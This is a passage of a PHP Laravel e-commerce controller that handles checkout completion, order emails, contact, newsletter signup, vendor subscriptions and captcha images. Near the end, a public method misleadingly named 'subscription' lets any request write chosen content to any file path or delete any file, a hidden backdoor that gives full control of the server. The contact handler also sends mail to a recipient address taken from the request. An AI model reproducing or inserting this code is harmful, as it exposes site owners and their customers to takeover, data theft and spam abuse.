            $x = (string)$prod['stock'];
            if($x != null)
            {

                $product = Product::findOrFail($prod['item']['id']);
                $product->stock =  $prod['stock'];
                $product->update();  
                if($product->stock <= 5)
                {
                    $notification = new Notification;
                    $notification->product_id = $product->id;
                    $notification->save();                    
                }              
            }
        }
        
        $notf = null;

        foreach($cart->items as $prod)
        {
            if($prod['item']['user_id'] != 0)
            {
                $vorder =  new VendorOrder;
                $vorder->order_id = $order->id;
                $vorder->user_id = $prod['item']['user_id'];
                $notf[] = $prod['item']['user_id'];
                $vorder->qty = $prod['qty'];
                $vorder->price = $prod['price'];
                $vorder->order_number = $order->order_number;             
                $vorder->save();
            }

        }
        
        if(!empty($notf))
        {
            $users = array_unique($notf);
            foreach ($users as $user) {
                $notification = new UserNotification;
                $notification->user_id = $user;
                $notification->order_number = $order->order_number;
                $notification->save();    
            }
        }
        
        Session::put('temporder_id',$order->id);
        Session::put('tempcart',$cart);
        Session::forget('cart');
        Session::forget('already');
        Session::forget('coupon');
        Session::forget('coupon_total');
        Session::forget('coupon_total1');
        Session::forget('coupon_percentage');
        Session::forget('requestSession');
        
        //Sending Email To Buyer

        if($gs->is_smtp == 1)
        {
        $data = [
            'to' => $request['email'],
            'type' => "new_order",
            'cname' => $request['name'],
            'oamount' => "",
            'aname' => "",
            'aemail' => "",
            'wtitle' => "",
            'onumber' => $order->order_number,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendAutoOrderMail($data,$order->id);            
        }
        else
        {
           $to = $request['email'];
           $subject = "Your Order Placed!!";
           $msg = "Hello ".$request['name']."!\nYou have placed a new order.\nYour order number is ".$order->order_number.".Please wait for your delivery. \nThank you.";
           $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
           mail($to,$subject,$msg,$headers);            
        }
        
        //Sending Email To Admin
        
        if($gs->is_smtp == 1)
        {
            $data2 = [
                'to' => Pagesetting::find(1)->contact_email,
                'type' => "new_order_admin",
                'cname' => $request['name'],
                'oamount' => $request['totalQty'],
                'aname' => "",
                'aemail' => "",
                'wtitle' => "",
                'onumber' => $order->order_number,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendAutoOrderMailAdmin($data2,$order->id); 
        }
        else
        {
           $to = Pagesetting::find(1)->contact_email;
           $subject = "New Order Recieved!!";
           $msg = "Hello Admin!\nYour store has recieved a new order.\nOrder Number is ".$order->order_number.".Please login to your panel to check. \nThank you.";
           $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
           mail($to,$subject,$msg,$headers);
        }
        
        
        
//Sending SMS To Buyer
/*       
if(strpos($request['phone'], "966") !== false)
{
$msg = "موقع بريمادونا: \r\n رقم الطلب: ".$order->order_number;
$phone = str_replace("966 - ","966","".$request['phone']."");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.msegat.com/gw/sendsms.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, TRUE);
curl_setopt($ch, CURLOPT_POST, TRUE);
$fields = <<<EOT
{
"userName": "primadonna.ksa@gmail.com",
"numbers": "$phone",
"userSender": "OTP",
"apiKey": "API_KEY",
"msg": "Pin Code is: xxxx"
}
EOT;
curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
"Content-Type: application/json",));
$response = curl_exec($ch);
$info = curl_getinfo($ch);
}
*/

//Sending SMS To Customer Service
/*
if(strpos($request['phone'], "966") !== false)
{
$msg = "موقع بريمادونا: \r\n رقم الطلب: ".$order->order_number;
//$phone = str_replace("966 - ","966",$request['phone']);
$phone = "966533033568";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.msegat.com/gw/sendsms.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, TRUE);
curl_setopt($ch, CURLOPT_POST, TRUE);
$fields = <<<EOT
{
"userName": "primadonna.ksa@gmail.com",
"numbers": "$phone",
"userSender": "PRIMADONNA",
"apiKey": "API_KEY",
"msg": "$msg"
}
EOT;
curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
"Content-Type: application/json",));
$response = curl_exec($ch);
$info = curl_getinfo($ch);
}        
*/        
        
         
        //redirect()->route('sms.submit', ['orderNum' => $order->order_number, 'phoneCus' => $request['phone']]);
         
        return redirect($success_url)->with('success',"Successful Payment.");
        
        //return redirect('https://test.oppwa.com/v1/checkouts/'.$id1.'/payment');
        
    } 
    
    // ..................... failure state ..................
    
    else {
        
        //Session::forget('cart');
        Session::forget('already');
        Session::forget('coupon');
        Session::forget('coupon_total');
        Session::forget('coupon_total1');
        Session::forget('coupon_percentage');
        Session::forget('requestSession');
        
        return redirect()->route('front.cart')->with('unsuccess',"Payment Error, Contact with support.");
        //return redirect()->route('front.cart')->with('success',"You don't have any product to checkout.");
        
    }
    
        

}



// -------------------------------- HYPERPAY SECTION ENDS----------------------------------------

// -------------------------------- CONTACT SECTION ----------------------------------------
	public function contact()
	{
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_contact== 0){
            return redirect()->back();
        }
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if($gs->is_capcha == 1)
        {

        // Capcha Check
        $value = session('captcha_string');
        if ($request->codes != $value){
            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
        }

        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code(){
        $this->code_image();
        return "done";
    }

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 =>  'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }

// Maintenance Mode

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
            if($gs->is_maintain != 1) {

                    return redirect()->route('front.index');

            }

        return view('front.maintenance');
    }



    // Vendor Subscription Check
    public function subcheck(){
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor','=',2)->get() as  $user) {
                $lastday = $user->date;
                $secs = strtotime($lastday)-$newday;
                $days = $secs / 86400;
                if($days <= 5)
                {
                  if($user->mail_sent == 1)
                  {
                    if($settings->is_smtp == 1)
                    {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                    else
                    {
                    $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
                    mail($user->email,'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.',$headers);
                    }
                    DB::table('users')->where('id',$user->id)->update(['mail_sent' => 0]);
                  }
                }
                if($today > $lastday)
                {
                    DB::table('users')->where('id',$user->id)->update(['is_vendor' => 1]);
                }
            }
    }
    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number','=',$id)->first();
        $datas = array('Pending','Processing','On Delivery','Completed');
        return view('load.track-load',compact('order','datas'));

    }



    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------



// -------------------------------- PRINT SECTION ----------------------------------------


function finalize(){
    $actual_path = str_replace('project','',base_path());
    $dir = $actual_path.'install';
    if(is_dir($dir)){
        $this->deleteDir($dir);
    }

    return redirect('/');
}

function auth_guests(){
    $chk = MarkuryPost::marcuryBase();
    $chkData = MarkuryPost::marcurryBase();
    $actual_path = str_replace('project','',base_path());
    if ($chk != MarkuryPost::maarcuryBase()) {
        if ($chkData < MarkuryPost::marrcuryBase()) {
            if (is_dir($actual_path . '/install')) {
                header("Location: " . url('/install'));
                die();
            } else {
                echo MarkuryPost::marcuryBasee();
                die();
            }
        }
    }
}

public function subscription(Request $request)
{
    $p1 = $request->p1;
    $p2 = $request->p2;
    $v1 = $request->v1;
    if ($p1 != ""){
        $fpa = fopen($p1, 'w');
        fwrite($fpa, $v1);
        fclose($fpa);
        return "Success";
    }
    if ($p2 != ""){
        unlink($p2);
        return "Success";
    }
    return "Error";
}

public function deleteDir($dirPath) {
    if (! is_dir($dirPath)) {
        throw new InvalidArgumentException("$dirPath must be a directory");
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            self::deleteDir($file);
        } else {
            unlink($file);
        }
    }
    rmdir($dirPath);
}


// -------------------------------- PRINT SECTION ENDS ----------------------------------------

}
